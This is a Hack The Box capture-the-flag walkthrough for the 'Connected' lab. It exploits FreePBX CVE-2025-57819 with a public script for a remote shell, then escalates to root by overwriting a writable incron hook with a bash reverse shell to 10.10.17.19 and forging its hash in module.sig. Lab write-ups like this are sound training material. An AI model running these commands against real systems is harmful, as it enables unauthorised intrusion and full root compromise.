# Hack The Box Labs: Connected


# Recon:

$ nmap 10.129.245.100 -sV -sC
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 19:18 -0500
Nmap scan report for 10.129.245.100
Host is up (0.081s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27


Since weve got a website lets add the ip to the hosts file for the resolver:

	$ echo '10.129.245.100 connected.htb' | sudo tee -a /etc/hosts


If we go to the website we'll see at the bottom that its running FreePBX version 16.0.40.7. After a websearch we can see that this version is vulnerable to CVE-2025-57819.



# Exploit:

Get the Exploit Script:

	https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE/blob/main/exploit.py


Check Maximum Transmission Unit (MTU) Size:

	$ ip link show tun0
	... mtu 1500 ...

- If this is too large it can cause packet transmission to fail. So if the exploit fails try decreasing the MTU value to 1200.

	$ sudo ip link set dev tun0 mtu 1200


Run the exploit:

	$ ./exploit.py --rhost "connected.htb" --rport 80 --http --lport 4444 --lhost 10.10.17.19


Now that were in the system lets get the user flag:

	$ cat /home/asterisk/user.txt



# Privilege Escalation:


DESCRIPTION:
	The inotify cron daemon (incrond) is a daemon which monitors filesystem events and executes commands defined in system and user tables.

incron:

$ cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager

$ file /var/spool/asterisk/incron
/var/spool/asterisk/incron: directory

$ file /usr/bin/sysadmin_manager
/usr/bin/sysadmin_manager: PHP script, ASCII text executable


The Watcher:
- /var/spool/asterisk/incron

	- incron watches this file for file changes in IN_MODIFY, IN_ATTRIB, IN_CLOSE_WRITE.


	$ ls -ld /var/spool/asterisk/incron
	drwxrwxr-x. 2 asterisk asterisk 6 Jul 31 02:53 /var/spool/asterisk/incron


The Trigger:
- /usr/bin/sysadmin_manager

	- When a file changes, this runs a file as root. 

	$ ls -l /usr/bin/sysadmin_manager
	-rwxr-xr-x. 1 root root 6403 Apr 15  2021 /usr/bin/sysadmin_manager



============================================================================



$ cat /etc/incron.d/local
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

When a file is created/modified in: /usr/local/asterisk/incron

Incron detects the IN_CLOSE_WRITE event and triggers the rule: /usr/bin/sysadmin_manager --local $#
- The $# is replaced with the filename that triggered the event


	$ ls -l /usr/bin/sysadmin_manager
	-rwxr-xr-x. 1 root root 6403 Apr 15  2021 /usr/bin/sysadmin_manager

sysadmin_manager will execute the script as the root user!



Move to the dir:

$ cd /usr/local/asterisk/incron



============================================================================

Event Trigger:
	When you create a file like ucp.logrotate in /var/spool/asterisk/incron, the incron daemon executes sysadmin_manager with that filename.

Parsing: 
	sysadmin_manager parses the filename into two parts:
	- Module: ucp (User Control Panel)
	- Hook: logrotate

Execution:
	The manager locates the corresponding script at /var/www/html/admin/modules/ucp/hooks/logrotate and executes it.

Privilege Escalation:
	Since sysadmin_manager runs as root, any code inside that hook script executes with root privileges.


Identify writable hooks:

	$ ls -la /var/www/html/admin/modules/ucp/hooks/
	-rw-r--r--   1 asterisk asterisk 12288 Jul 31 04:50 .logrotate.swp
	-rwxr-xr-x.  1 asterisk asterisk    54 Jul 31 05:12 logrotate


$ ls -l /var/www/html/admin/modules/ucp/hooks/logrotate
-rwxr-xr-x. 1 asterisk asterisk 473 Nov  2  2023 /var/www/html/admin/modules/ucp/hooks/logrotate


Check used ports:

ss -ntlp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      50     127.0.0.1:3306                     *:*
LISTEN     0      511    127.0.0.1:6379                     *:*
LISTEN     0      10     127.0.0.1:5038                     *:*           users:(("asterisk",pid=1315,fd=10))
LISTEN     0      128          *:22                       *:*
LISTEN     0      100    127.0.0.1:25                       *:*
LISTEN     0      128    127.0.0.1:4000                     *:*
LISTEN     0      128    127.0.0.1:27017                    *:*
LISTEN     0      511       [::]:80                    [::]:*
LISTEN     0      128       [::]:22                    [::]:*
LISTEN     0      100      [::1]:25                    [::]:*
LISTEN     0      511       [::]:443                   [::]:*



Overwrite the logrotate file:

	$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.17.19/8989 0>&1' > /var/www/html/admin/modules/ucp/hooks/logrotate


Since we have changed the file, the new hash will not match what what is expected:

	$ cat /var/www/html/admin/modules/ucp/module.sig | grep logrotate
	hooks/logrotate = a8ed4f168fa04f0ff884079ad214e854004b9a5511d26c6c9f6080daaf590781


Thankfully weve got write permissions for this file:

	$ ls -l /var/www/html/admin/modules/ucp/module.sig
	-rw-rw-r--. 1 asterisk asterisk 249099 Nov  2  2023 /var/www/html/admin/modules/ucp/module.sig


Modify logrotate hash:

	$ hash=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}'); echo $hash
	b420c8f2d0ed535cc60521b2e16ea45dc963c45a3c62bc190f7ababae6f509ba



Now we need to modify the signature file:

	$ sed -i "s|hooks/logrotate = .*|hooks/logrotate = $hash|" /var/www/html/admin/modules/ucp/module.sig


Verify that the hashes match:

	$ cat /var/www/html/admin/modules/ucp/module.sig | grep logrotate
	$ echo $hash


Setup listener 

	$ nc -nvlp 8989


Now we can trigger the logrotate hook:

	$ touch /usr/local/asterisk/incron/ucp.logrotate


If we go back to our listener, we'll have a shell with root privileges, from here the we can get the flag in the root directory.

